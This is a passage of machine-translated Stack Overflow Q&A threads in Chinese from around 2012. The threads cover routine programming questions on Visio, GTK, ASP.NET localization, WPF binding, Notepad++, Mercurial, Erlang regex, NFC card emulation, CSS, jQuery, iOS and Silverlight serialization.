据我所知，您不能在 EditText 视图中显示图像。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T13:27:40.797

请改用[WebView](http://developer.android.com/reference/android/webkit/WebView.html)。它将允许您独立于布局显示文本和图像。

# vba - 如何在 UML 图中控制连接器的路径

> ID：12215881
> 
> 赞同：0
> 
> 时间：2012-08-31T12:59:44.853
> 
> 标签：vba, uml, visio

我正在以编程方式在 visio 中绘制 UML 图，其中我使用动态连接器来连接形状。但是在某些情况下，连接器穿过形状而不是穿过页面（即连接器从源形状到目标形状的路径通过位于源和目标之间的另一个形状），我希望连接器应该只通过页面。请建议如何使这成为可能。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-10T17:06:42.600

您必须从 C# 进行翻译，但这就是我的做法：

```
/// <summary>Attaches two Visio shapes to each other with the specified connector object.</summary>
/// <param name="shape1">Visio shape to connect from.</param>
/// <param name="shape2">Visio shape to connect to.</param>
/// <param name="connector">Visio line shape that will connect shape1 to shape2.</param>
/// <param name="straight">Whether this connector should be a straight line</param>
[CLSCompliant(false)]
protected static void ConnectShapes(
    Visio.Shape shape1,
    Visio.Shape shape2,
    Visio.Shape connector,
    bool straight = false)
    {
        try
        {
            // get the cell from the source side of the connector
            Visio.Cell beginXCell = connector.CellsSRC[(short)Visio.VisSectionIndices.visSectionObject, (short)Visio.VisRowIndices.visRowXForm1D, (short)Visio.VisCellIndices.vis1DBeginX];

            // glue the source side of the connector to the first shape
            beginXCell.GlueTo(shape1.CellsSRC[(short)Visio.VisSectionIndices.visSectionObject, (short)Visio.VisRowIndices.visRowXFormOut, (short)Visio.VisCellIndices.visXFormPinX]);

            // get the cell from the destination side of the connector
            Visio.Cell endXCell = connector.CellsSRC[(short)Visio.VisSectionIndices.visSectionObject, (short)Visio.VisRowIndices.visRowXForm1D, (short)Visio.VisCellIndices.vis1DEndX];

            // glue the destination side of the connector to the second shape
            endXCell.GlueTo(shape2.CellsSRC[(short)Visio.VisSectionIndices.visSectionObject, (short)Visio.VisRowIndices.visRowXFormOut, (short)Visio.VisCellIndices.visXFormPinX]);

            if (straight)
            {
                connector.CellsU["ConLineRouteExt"].ResultIUForce = (double)Visio.VisCellVals.visLORouteExtStraight;
                connector.CellsU["ShapeRouteStyle"].ResultIUForce = (double)Visio.VisCellVals.visLORouteCenterToCenter;
            }
            else
            {
                // THIS IS WHAT YOU ARE LOOKING FOR
                connector.CellsU["ConLineRouteExt"].ResultIUForce = (double)Visio.VisCellVals.visLORouteExtNURBS;
                connector.CellsU["ShapeRouteStyle"].ResultIUForce = (double)Visio.VisCellVals.visLORouteRightAngle;
            }
        }
        catch (Exception e)
        {
            throw (e);
        }
    } 
```

# python - 如何开始创建自定义 GTK 小部件（使用 python）？

> ID：12215886
> 
> 赞同：1
> 
> 时间：2012-08-31T13:00:01.827
> 
> 标签：python, user-interface, gtk, pygtk, gnome

一般来说，这是一个 GTK 问题，但我只使用了 pygtk，所以如果它影响答案，请记住这一点。

我已经掌握了基本 GTK 小部件的窍门，但我现在必须实现一些“点菜”不可用的东西。

基本上我正在尝试创建一个类似于旧的 Windows Movie Maker / OpenShot 时间线的“时间线”。我的时间线将用于文档，但是，它们可以被 DNDd 到时间线上并重新排列以指定它们的顺序，较大的文档将在时间线上“更长”。

它用于合并现有文件。

我的问题是：我该如何开始？我应该使用绘图区吗？其他 GTK 应用程序似乎具有与系统样式和颜色完美匹配的定制小部件 - 绘图区域似乎如此原始。我使用样式吗？我是否对现有小部件进行子类化？

tl;dr 帮助我开始创建一个独特的 GTK 小部件。

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-04T03:43:30.170

[在http://packages.python.org/pygtkhelpers/index.html](http://packages.python.org/pygtkhelpers/index.html)检查 pygtkhelpers 的来源

那里有许多自定义小部件，还有一些帮助函数，可以让您轻松创建属性和信号。

# asp.net - 使用 C# 的 asp.net 中的多语言支持网站，记录来自 SQL Server

> ID：12215889
> 
> 赞同：0
> 
> 时间：2012-08-31T13:00:06.897
> 
> 标签：asp.net

在此先感谢，我知道这是非常重复且被问到的问题，但我没有得到任何适当的解决方案，我为此参考了很多网站。

问题：我正在开发和订购网站，需要多种语言支持，如英语、西班牙语、法语、阿拉伯语和近 10 种语言。我如何管理从 css 到图像的所有东西，从数据库中获取记录很多东西都在我的脑海中进行设置。

我可以使用一种解决方案我可以为表中的每种语言创建字段，例如我需要为英语、西班牙语保留的描述字段......

在不使用任何第三方工具的情况下使用动态语言翻译的最佳方式是什么。

请告诉我解决方案。

如果你没有得到我的问题，请问我。

我需要绝望的帮助

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T13:25:26.637

您可以将工作基于本地化和全球化

链接：http: [//msdn.microsoft.com/fr-fr/library/ms247246%28v=vs.100%29.aspx](http://msdn.microsoft.com/fr-fr/library/ms247246%28v=vs.100%29.aspx)

为了开始，您可以测试这些功能

```
Generating Default Resource File : 
```

在 Visual Studio 设计器中，单击设计器图面或控件。

选择工具 --> 生成本地资源

将生成 App_LocalResources 文件夹中 Web 页面的基于 XML 的本地资源文件，其中包含页面上所有现有控件的 Text 和 ToolTip 值以及页面标题。

```
Generating Resource Files for Other Cultures: 
```

在解决方案资源管理器中

右键单击“Default.aspx.resx”文件，然后单击复制

右键单击 App_LocalResources 文件夹，然后单击粘贴

右键单击“Default.aspx.resx 的副本”，然后单击重命名

为在扩展名前包含新语言和文化代码的资源文件键入新名称。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T13:34:25.410

就数据库而言，解决方案是您将拥有一个`Languages`表，并且您的每个用户都将在数据库中根据其记录使用一种语言，或者用户可以从页面上的下拉列表中选择语言。我说的所有实体表`UserStatus`，`UserTypes`等等都会有一个相关的语言表，比如：`UserStatus_Lang`，它将保存语言特定的文本，比如：

```
UserStatus Table
UserStatusId
1

UserStatus_Lang
UserStatusId_FK    LangId_FK    Text
1                  1            Online
1                  2            ****** 
```

保存时您将保存实体表的 ID，但在显示时您将显示`_Lang`表中的文本。

对于页面上的标签等控件，您将创建一个 table `Pages`，它将保存页面的页面名称，而不是另一个 table`PageControls`来保存页面上存在的控件，而不是另一个 table`PageControlsText`将针对页面控件保存语言特定文本。在 Page_Init 事件中，您将从数据库中获取页面控件及其文本（根据所选语言），并通过在页面上搜索来设置页面控件的文本。

我希望你对这个实现有一些想法。===============================修改=================== =================

页表

```
PAGEID     PAGENAME   [OTHER COLUMNS] 
```

页面控制表

```
PAGECONTROLID      PAGEID_FK    PAGECONTROLNAME    [OTHER COLUMNS] 
```

页面控制文本表

```
PAGECONTROLID_FK     LANGID_FK     PAGECONTROLTEXT 
```

就您的描述而言，您必须像在 2 个表 TABLE1 中那样进行操作

```
ID          ITEM_NAME 
```

比另一个表 TABLE1_LANG

```
ID_FK       LANGID_FK        DESCRIPTION 
```

通过使用这种方法，当系统中引入新语言时，您无需修改​​结构。

# c# - 如何将非布尔属性绑定到布尔属性

> ID：12215891
> 
> 赞同：1
> 
> 时间：2012-08-31T13:00:13.153
> 
> 标签：c#, .net, winforms, user-interface, data-binding

我正在为我的项目设计 GUI。我需要做的是根据绑定源中的布尔值更改标签的颜色。但问题是我需要为绑定源没有这个的标签分配一个颜色（我不希望绑定源中有一个颜色属性）。

当 bool 为真否则为黑色时，如何处理使标签变为红色？

提前致谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-31T13:06:57.287

由于您无法直接绑定它们，因此您必须在任一侧创建一个额外的属性。您可以在（业务）对象中添加一个 Color 属性（您说过您不想要），这样就可以在表单/控件上添加一个属性，该属性绑定到您的（业务）对象上的属性。

更新

如果要向可以绑定的表单添加属性，请添加以下内容。

```
public bool MyPropertyToBindTo {
    get { return _myLabel.Color == Color.Red; }
    set { _myLabel.Color = value ? Color.Red : Color.Black; }
} 
```

现在您可以将业务对象属性绑定到此属性，它应该可以工作。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-31T13:17:42.773

您可以为此使用转换器。（我已经从多个来源复制/更新了这段代码，请原谅一些语法错误。）

```
public class BoolToColorConverter : IValueConverter
{
    public object Convert(object value, Type targetType, object parameter, CultureInfo culture)
    {
        Color labelColor;
        // Implement your conversion code here ...

        return labelColor;
    }

    public object ConvertBack(object value, Type targetType, object parameter, CultureInfo culture)
    {
        // As far as I understood your question you
        // will not need to convert back.
        return DependencyProperty.UnsetValue;
    }
} 
```

然后您需要在您的 XAML`UserControl`或部件`Window`中定义它`Resources`（转换器是命名空间）。（在本例中，`converter`映射到`BoolToColorConverter`定义的命名空间。）

```
<UserControl.Resources>
  <converter:BoolToColorConverter x:Key="boolToColor" />
</UserControl.Resources> 
```

之后，您终于可以在您的 XAML 中使用它进行此绑定：

```
<Label Content="{Binding Path=YourBoundProperty, Converter={StaticResource boolToColor}}" /> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-31T13:07:04.587

如果您使用 Wpf，则可以使用 Converter

关于颜色和价值的链接：[http ://www.c-sharpcorner.com/uploadfile/dpatra/value-converter-in-wpf-part-i/](http://www.c-sharpcorner.com/uploadfile/dpatra/value-converter-in-wpf-part-i/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-31T13:33:34.247

只是不要将布尔属性绑定到控件，覆盖`DataBinding`事件，并在该事件处理程序中根据布尔变量设置`Color`你的。`Label`该`DataBinding`事件存在（至少部分地）供您放置对于传统数据绑定而言过于复杂的数据绑定逻辑。

# notepad++ - 在多个文件中搜索多个单词

> ID：12215896
> 
> 赞同：35
> 
> 时间：2012-08-31T13:00:22.077
> 
> 标签：notepad++

我必须搜索大量`.txt`文件。我知道我可以进行多个单词搜索，但这是我的问题。我希望我的结果只是`.txt`包含搜索条目的所有单词的文件。

例如：

**文件 1**：

```
test1 
```

**文件 2**：

```
 test1
 test2 
```

搜索文件`test1`并且`test2`只会显示文件 2。

希望有人可以帮助我。谢谢

* * *

## 回答 #1

> 赞同：55
> 
> 时间：2013-07-26T06:58:37.497

如果您使用的是 Notepad++ 编辑器（如问题标签所示），您可以使用出色的“在文件中查找”功能。

转到`Search > Find in Files`（键盘上瘾的*Ctrl+Shift+F*）并输入：

*   找到什么 =`(test1|test2)`
*   过滤器 =`*.txt`
*   Directory = 输入您要搜索的目录的路径。您可以检查`Follow current doc.`是否有要填充的当前文件的路径。
*   搜索模式 =`Regular Expression`

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2018-10-16T08:35:57.043

如果您使用的是 Notepad++ 编辑器 Goto ctrl + F 选择 tab 3 find in files 并输入：

1.  查找内容 = text1*.*text2
2.  过滤器：*。*
3.  搜索模式 = 正则表达式
4.  目录 = 输入您要搜索的目录的路径。您可以勾选关注当前文档。使当前文件的路径被填充。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2021-10-12T08:47:13.407

这是另一个“如果你使用 X”的解决方案，但如果你使用 GitHub，你可以使用搜索栏在你的存储库中查找代码。然后它将列出与该代码部分匹配的文件。

# svn - 使用子目录分支迁移

> ID：12215897
> 
> 赞同：1
> 
> 时间：2012-08-31T13:00:25.270
> 
> 标签：svn, mercurial

我正在尝试将 SVN 存储库转换为 Mercurial。几百年前的修订版，从主干的子目录（而不是整个主干）创建了一个分支。

```
trunk
  * subdir
  * ...
branches
  * foo (forked from subdir)
  * ... (other branches fork from trunk)
tags
  * ... 
```

我尝试使用 convert 扩展来转换存储库，但是 foo 导致了问题。它显示在转换后的存储库中，不是来自主干的分支，而是来自名为“subdir”的新分支。subdir 分支与主干平行，对主干所做的任何更改都会复制到 subdir 上。

这是转换后存储库的简略视图：

```
 .
  .
  |
  *  202  foo      Created foo branch
. |
. *  201  subdir   Added XYZ
| |
* .  200  default  Added XYZ
| .
. .
. |
. *    4  subdir   Fixed DEF
| |
* |    3  default  Fixed DEF
| |
| *    2  subdir   Added ABC
|  
*      1  default  Added ABC 
```

代替：

```
 .
  .
. |
. *  101  foo      Created foo branch
|/
*    100  default  Added XYZ
|
.
.
.
|
*      2  default  Fixed DEF
|  
*      1  default  Added ABC 
```

如何修复存储库（转换前或转换后）以使分支与第二个图匹配？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T09:09:56.040

# 转换后方式

你有两个任务：

*   从 subdir 分支中删除重复的修订
*   更改 foo 分支的第一个真实变更集的父级

## 您可以使用不同的方法在“subdir”中杀死 202 之前的变更集

*   MQ（2 个版本）
    *   将变更集转换为 mq 补丁，取消应用所有补丁，删除补丁
    *   将变更集转换为 mq 补丁，取消应用所有补丁，将存储库克隆为新的，永远使用新的
*   Histedit 扩展（与 TortoiseHG 捆绑） - 启用、使用、删除所有错误提交

## 将 foo 分支链接到正确的父级

`hg rebase -s 202 -d 200`（根据您的第一个图表，使用哈希或书签/添加它/会更好，更防弹）。“subdir”的孤立变更集将在之后消失`hg clone -r tip`

# regex - 用正则表达式多次替换感叹号

> ID：12215899
> 
> 赞同：1
> 
> 时间：2012-08-31T13:00:27.727
> 
> 标签：regex, erlang

我需要替换句子中的所有感叹号，我可以为第一个感叹号做到这一点，但我不明白如何让它重复随机字符串中的所有单词/空格而不循环。

```
Sentence = "! word! hello cat! you are !! the one"
regex:replace(Sentence, "!", "" ); 
```

这将返回“单词！你好猫！你是！！那个”。那么这可能没有循环吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-31T13:42:21.870

*这是一个正式的答案（将其从评论中移出）。*

只需在正则表达式替换例程中使用**全局修饰符：**

```
Sentence = "! word! hello cat! you are !! the one"
re:replace(Sentence, "!", "", [global, {return, list}, unicode]) 
```

# slickgrid - SlickGrid - 在编辑器构造函数中干净地取消编辑

> ID：12215900
> 
> 赞同：0
> 
> 时间：2012-08-31T13:00:31.290
> 
> 标签：slickgrid

我想从自定义编辑器的构造函数中取消编辑并导致活动单元格失去焦点。目前，我可以`cancelEdit`从传递给构造函数的对象中调用，但我还必须在 , 中使用标志，`loadValue`并检查是否发生过早取消。此外，发生这种情况时，单元格不会失去焦点。`isValueChanged``serializeValue``destroy`

这可能吗？

**编辑**

下面是编辑器构造函数的片段。它允许注册（添加）一个编辑器并为其分配一个名称。在调用时，编辑器获取 的值`args.item.type`并尝试检索为该值注册的编辑器。未显示的是仅遵循委托模式的代码，这会导致`MyConstructor`实例将工作委托给其内部编辑器实例。

如果没有与 的值匹配的编辑器`args.item.type`，则构造函数会尝试取消编辑。

```
MyConstructor = (function(){

    var editors = {}
    var defaultEditor = TextCellEditor

    constructorFn = function(args){
        this.init(args)
    }

    constructorFn.overridesEnabled = false
    constructorFn.defaultEditorEnabled = true;

    constructorFn.prototype.init = function(args){
        var editorExists = function(dataType){
            if(dataType in editors){
                return true
            }

            if(constructorFn.defaultEditorEnabled){
                return true
            }

            return false
        }

        var getEditor = function(args){
            if(args.item.type in editors){
                editorConstructor = editors[args.item.type]
                return new editorConstructor(args)
            }
            else{
                editorConstructor = defaultEditor
                return new editorConstructor(args)
            }
        }

        if(editorExists(args.item.type))
        {
            this.superClass.init.call(args)
            this.editor = getEditor(args)
        }
        else{
            debug.error("Prematurely destroying editor")
            args.cancelChanges()
            this.mumps = true
        }  
    }

    constructorFn.registerEditor = function(name, constructor){
        if(name in editors){
            if(constructorFn.overridesEnabled){
                editors[name] = constructor
            }
            else{
                //Log error
                debug.error("Cannot override existing constructor: " + name)
            }
        }
        else{
            editors[name] = constructor
        }
    }
})() 
```

# .net - Castle Windsor 能否扫描 zip 文件中的程序集？

> ID：12215901
> 
> 赞同：2
> 
> 时间：2012-08-31T13:00:31.267
> 
> 标签：.net, plugins, castle-windsor

我很好奇是否有一种策略可以插入到 Castle Windsor 中，让它以任意方式扫描程序集，即不仅仅是内存中的程序集或目录中的程序集。自己构建发现机制，加载这些程序集，然后使用 Castle 扫描它们似乎很容易。但我想知道是否有内置机制？

一个想法是，NuGet 包可以直接就地执行，而无需通过战略性使用发现和 .net 程序集解析事件来解包。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T21:24:52.110

不，没有这样的内置功能。

# java - hibernate：如何将变量映射为外键

> ID：12215906
> 
> 赞同：1
> 
> 时间：2012-08-31T13:00:56.317
> 
> 标签：java, hibernate, mapping

是否可以将变量声明`Long documentID`为外键而不是自然的`Document document`？下面的例子：

```
@Entity
@Table("document")
class Document{
   ...
   @Id
   Long id;
   ...
}

@Entity
@Table("something")
class Something{
   ....
   //instead of
   @ManyToOne
   Document document;

   // this one with the appropriate annotations
   Long documentID;
   ...
} 
```

提前致谢....

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T13:26:15.803

似乎已经出现了一个类似的问题：[Hibernate。id 外键映射](https://stackoverflow.com/questions/5487055/hibernate-foreign-key-mapping-by-id)

不建议以这种方式使用 hibernate。

# android - 通过 OpenNFC 进行卡模拟

> ID：12215911
> 
> 赞同：3
> 
> 时间：2012-08-31T13:01:08.527
> 
> 标签：android, nfc, hce, open-nfc

我目前正在研究在支持 NFC 的智能手机上进行卡模拟的可能性。基本上，我想做的是将手机用于可重新配置的物理访问系统。据我了解的方法，在阅读 api 时，卡仿真通过天线和智能手机的操作系统工作，而不使用和依赖安全元件。但我实际上对此完全不确定。

有没有人能够通过 Open NFC 软件堆栈使用卡模拟？我完全迷失了这一点，因为它的文档风格非常混乱，并且没有提供卡片仿真案例的示例。

此外，如果有人能够使用它，我真的很想知道是否有任何要求我必须满足电话才能使其工作。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T11:32:51.877

在大多数 Android 手机上，卡片模拟将被关闭。其中一些将指向嵌入式安全元素（谷歌钱包）或 SIM（Cityzi 和 Quicktap 钱包）。

OpenNFC 提供了主机进行卡模拟的可能性（理论上），但可能会出现一些性能问题。

另一个问题是，目前大多数 Android 手机都包含 NXP 芯片组，OpenNFC 无法驱动这些芯片组。

如果您希望执行卡模拟，您应该查看[EasyNFC](http://www.google.fr/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&ved=0CCUQFjAA&url=http%3A%2F%2Fizynfc.sourceforge.net%2F&ei=LRZTUPGVEsKGhQf_s4GYAw&usg=AFQjCNFZ2BfwJkwNaNmBa7mtomM73bvKoA)，它可以让您在 SIM 中构建 NFC 应用程序。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-04T09:04:05.803

因此，似乎没有人可以给出明确的答案，至少我能够通过其他渠道回答我的问题。这是我发现的。

基本上，OpenNFC 软件堆栈旨在通过硬件抽象层的帮助与任何硬件一起工作。此 HAL 目前仅为其自己的 SecuRead 和 MicroRead 芯片组提供。所以开箱即用是不可能的。

对于 Android 上的卡片模拟案例：正如你们中的许多人所知，如果没有安全元件的帮助，通常无法使用卡片模拟模式。我正在寻找的是某种软件卡仿真的可能性。这可能与 Cyanogenmod [1](http://www.cyanogenmod.com/)一起提供（有一些夜间版本被激活，您可以通过在此处查看此项目找到更多信息：NFCProxy [2](http://sourceforge.net/p/nfcproxy/wiki/Home/)）。最近（实际上正是我提出问题的那天），这些功能被移植到最新版本的果冻豆中。

# css - CSS：渐变文本颜色？

> ID：12215915
> 
> 赞同：4
> 
> 时间：2012-08-31T13:01:23.003
> 
> 标签：css, gradient, mask

我试图让一些文本具有渐变色，但我不知道如何。我试图这样得到它：

![渐变图像](../Images/38846bffa9ad8b314d43a13d6a8de559.png)

我唯一尝试过的是`-webkit-mask`，但我无法让它按照我想要的方式工作。另一件事是`-webkit-gradient`在`color`财产中-这可能吗？

跨浏览器兼容性相当重要，但不是世界末日。我更喜欢文本在 IE 中是纯色，而不是将整个内容转换为图像（有很多这样的文本，其中一些是动态的）。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-31T13:02:43.747

对于基于 webkit 的浏览器（Chrome 和 Safari）：

```
.text {
  font-size: 20px;
  background: -webkit-gradient(linear, left top, left bottom, from(#fff), to(#111));
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
} 
```

对于 IE 和其他：

[http://www.webdesignerwall.com/demo/css-gradient-text/](http://www.webdesignerwall.com/demo/css-gradient-text/)

# jquery - jquery blockUI 在按钮单击时没有任何反应

> ID：12215916
> 
> 赞同：1
> 
> 时间：2012-08-31T13:01:24.287
> 
> 标签：jquery, blockui, jquery-blockui

```
<html>
    <head>
        <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.8.0/jquery.min.js"></script>
        <script type="text/javascript" src="jquery.blockUI.js"></script>
        <script>
            $(document).ready(function() {
                $('#fullscreen').click(function() {
                    $.blockUI({
                        message: $('#fs_div'),
                        css: {
                            top: 0,
                            left: 0,
                            width: 100%
                        }
                    });
                });
            });
        </script>
    </head>
    <body>
        <button id="fullscreen">Fullscreen</button>
        <div id="fs_div" style="display: none;">Fullscreen Div</div>
    </body>
</html> 
```

我已经编写了上面的简单代码来显示 jquery blockUI 框，但是单击按钮时没有任何反应。我四处寻找解决方案，但我无法弄清楚我哪里出错了。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T13:07:48.897

```
<div id="fs_div" style="display: none;">Fullscreen Div</div> 
```

你正在设置`width:100%`

这将做到这一点

```
 css: {
                            top: 0,
                            left: 0,
                            width: '100%'
                        } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T13:08:00.653

只需将您的宽度参数更改为`width: '100%'` 小提琴：http: [//jsfiddle.net/zFSGq/](http://jsfiddle.net/zFSGq/)

# iphone - UIGraphicsBeginImageContextWithOptions 无声无息地崩溃

> ID：12215921
> 
> 赞同：2
> 
> 时间：2012-08-31T13:01:37.673
> 
> 标签：iphone, ios, xcode

所以我有一个功能，它需要 2 张图像并将它们组合起来。也许图像太大了，因为当我尝试使用 2 个较小的图像时它可以正常工作，但我不确定。所以我用相机拍了一张照片，然后尝试从相册中打开它。我选择图像并使用此功能将其与另一个图像组合：

```
- (UIImage*)imageByCombiningImage:(UIImage*)firstImage withImage:(UIImage*)secondImage {

    UIImage *image = nil;

    float scale = 0.5f;

    CGSize newImageSize = CGSizeMake(MAX(firstImage.size.width, secondImage.size.width), MAX(firstImage.size.height, secondImage.size.height));

        NSLog(@"reached image by combining image");
    //crashes here when the image has been selected from an album (secondImage).
    // runs fine when the image has been taken from the camera. (secondImage). 

    if (UIGraphicsBeginImageContextWithOptions != NULL) {
        UIGraphicsBeginImageContextWithOptions(newImageSize, NO, [[UIScreen mainScreen] scale]);
    } else {
        UIGraphicsBeginImageContext(newImageSize); 
    }

    [firstImage drawAtPoint:CGPointMake(roundf((newImageSize.width-firstImage.size.width)/2), 
                                        roundf((newImageSize.height-firstImage.size.height)/2))]; 

    UIImage *scaledImage = 
    [UIImage imageWithCGImage:[secondImage CGImage] 
                        scale:scale orientation:UIImageOrientationUp];

    [scaledImage drawAtPoint:CGPointMake(roundf((100)), 
                                         roundf((100)))]; 
    image = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();

    return image;
} 
```

当我到达这条线时：

```
if (UIGraphicsBeginImageContextWithOptions != NULL) {
    UIGraphicsBeginImageContextWithOptions(newImageSize, NO, [[UIScreen mainScreen] scale]);
} else {
    UIGraphicsBeginImageContext(newImageSize); 
} 
```

它无声地崩溃。我认为这可能是一个内存问题？该方法也被异步调用。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-06-27T20:08:11.570

在合并时它停止崩溃之前，我必须将图像的大小减小 3。对它来说太大了。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T14:06:08.380

仅凭此信息，我无法解决您的问题，但我建议您检查几件事：

1.  你在主线程中：图形原语应该只从那个线程调用，你说它是异步调用的。检查这个异步线程是否是主线程。
2.  在发布之前删除未使用的代码：您在实际未使用的第一行创建 UIImageViews。这不仅浪费了您的应用程序的时间/资源，而且使调试和跟踪 SO 中的错误变得复杂。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-06-26T16:05:19.480

我也有同样的崩溃，完全正确！

从[UIGraphicsBeginImageContextWithOptions 崩溃](http://iphonedevsdk.com/forum/iphone-sdk-development/99027-uigraphicsbeginimagecontextwithoptions-crashing.html)

> 好的， UIGraphicsBeginImageContextWithOptions 是一个红鲱鱼。……

看来问题是 xxx 没有被释放。

# c# - 在 .net 项目中使用 SilverLight 库 (dll)

> ID：12215926
> 
> 赞同：2
> 
> 时间：2012-08-31T13:01:59.997
> 
> 标签：c#, .net, silverlight, serialization, runtime-error

我有一个 SilverLight 库 (dll)，它实现了我需要在 .net 项目中使用的类。[我遵循了这个答案](https://stackoverflow.com/questions/10088906/website-not-able-to-find-assemblies-for-silverlight-library)中描述的步骤，但我没有看到如何使用代理库来公开我需要的类。我在 .net 项目中添加了对代理的引用。该dll适用于silverlight 5，我使用的是.net 4.0。

如果我只是添加 dll 作为参考，我可以使用 SL 对象，但我不能序列化它们。

这是有问题的代码：

```
 static string SerializeWithDCS(object obj)
    {
        if (obj == null) throw new ArgumentNullException("obj");
        DataContractSerializer dcs = new DataContractSerializer(obj.GetType());
        MemoryStream ms = new MemoryStream();
        dcs.WriteObject(ms, obj);
        return Encoding.UTF8.GetString(ms.GetBuffer(), 0, (int)ms.Position);
    } 
```

序列化失败：

```
System.IO.FileNotFoundException: Could not load file or assembly 'System.Runtime.Serialization, Versio
n=5.0.5.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e' or one of its dependencies. The system ca
nnot find the file specified.                                                                         
File name: 'System.Runtime.Serialization, Version=5.0.5.0, Culture=neutral, PublicKeyToken=7cec85d7bea
7798e'                                                                                                
   at System.ModuleHandle.ResolveType(RuntimeModule module, Int32 typeToken, IntPtr* typeInstArgs, Int
32 typeInstCount, IntPtr* methodInstArgs, Int32 methodInstCount, ObjectHandleOnStack type)            
   at System.ModuleHandle.ResolveTypeHandleInternal(RuntimeModule module, Int32 typeToken, RuntimeType
Handle[] typeInstantiationContext, RuntimeTypeHandle[] methodInstantiationContext)                    
   at System.Reflection.RuntimeModule.ResolveType(Int32 metadataToken, Type[] genericTypeArguments, Ty
pe[] genericMethodArguments)                                                                          
   at System.Reflection.CustomAttribute.FilterCustomAttributeRecord(CustomAttributeRecord caRecord, Me
tadataImport scope, Assembly& lastAptcaOkAssembly, RuntimeModule decoratedModule, MetadataToken decora
tedToken, RuntimeType attributeFilterType, Boolean mustBeInheritable, Object[] attributes, IList deriv
edAttributes, RuntimeType& attributeType, IRuntimeMethodInfo& ctor, Boolean& ctorHasParameters, Boolea
n& isVarArg)                                                                                          
   at System.Reflection.CustomAttribute.IsCustomAttributeDefined(RuntimeModule decoratedModule, Int32 
decoratedMetadataToken, RuntimeType attributeFilterType, Boolean mustBeInheritable)                   
   at System.Reflection.CustomAttribute.IsDefined(RuntimeType type, RuntimeType caType, Boolean inheri
t)                                                                                                    
   at System.RuntimeType.IsDefined(Type attributeType, Boolean inherit)                               
   at System.Runtime.Serialization.CollectionDataContract.IsCollectionOrTryCreate(Type type, Boolean t
ryCreate, DataContract& dataContract, Type& itemType, Boolean constructorRequired)                    
   at System.Runtime.Serialization.DataContract.DataContractCriticalHelper.CreateDataContract(Int32 id
, RuntimeTypeHandle typeHandle, Type type)                                                            
   at System.Runtime.Serialization.DataContract.DataContractCriticalHelper.GetDataContractSkipValidati
on(Int32 id, RuntimeTypeHandle typeHandle, Type type) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-01-12T01:51:43.407

使用反射编写您自己的序列化。

这是我能想出的最佳解决方案——愿一个更好的人提供更好的答案。

问题确实似乎是来自 System.Runtime.Serialization 的属性，这些属性在 .NET 和 Silverlight 之间有所不同。在 Anders Gustafsson 所链接的问题中谈到了这一点。

我很困惑为什么我不能让它工作。

我尝试创建一个 AppDomain 并将所有必要的程序集加载到其中：

1.  一个冒充第三方程序集的测试dll，
2.  将执行序列化的 Silverlight 包装程序集，
3.  所有 Silverlight 5 核心组件和
4.  System.Runtime.Serialization 的 Silverlight 5 变体。

然后我在包装程序集中调用了调用序列化的代码——我仍然得到了异常。

这令人费解——也许我只是做错了什么。

如果有更多知识的人对此有话要说，我会非常感兴趣。

无论如何，*可以*编写自定义序列化程序，我认为这将解决问题。

# c# - 子类中的强制转换异常

> ID：12215931
> 
> 赞同：0
> 
> 时间：2012-08-31T13:02:13.147
> 
> 标签：c#, oop

我有两个班级 ClassA 和 CLassB。ClassA 是一个抽象类。ClassB 派生自 ClassA。我有一个名为 ParentDTO 的 DTO。

```
public class ParentDTO
{
    public int UserId { get; set; }
}

public abstract class ClassA
{
    public abstract void CreateUser(ParentDTO dto);
}

public class ClassB : ClassA
{
    public override void CreateUser(ParentDTO dto)
    {
        Console.WriteLine("You are in class ClassB");
    }
} 
```

现在我有一个 DTO(MyDTO)，它源自 ParentDTO。

```
public class MyDTO: ParentDTO
{
    public int MyID { get; set; }
} 
```

我进一步扩展了 ClassB：

```
public class ClassC : ClassB
{
    public override void CreateUser(ParentDTO dto)
    {
        var mydto = (MyDTO) dto;// This throws cast exception
        mydto.MyID=222;
    }
} 
```

我将上面的代码用作：

```
 ClassC c = new ClassC();
    ParentDTO dto=new ParentDTO();
    c.CreateUser(dto); 
```

有人可以告诉我如何在 ClassC 的 CreateUser 方法中投射 DTO。我想在我的代码中使用 mydto.MyID。我知道我正在做一些事情，比如将 Animal 转换为 Lion 而不是将 Lion 转换为 Animal。但是有什么方法可以使用子 DTO ID 吗？有人可以告诉我我做错了什么吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T13:16:04.790

您只是以错误的方式使用界面架构。添加 get，设置为 ParentDTO 类。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T13:04:15.307

除非将父类型变量初始化为子类型（或从子类型派生的其他类型），否则您不能将父类型变量强制转换为子类型。

```
ClassC c = new ClassC();
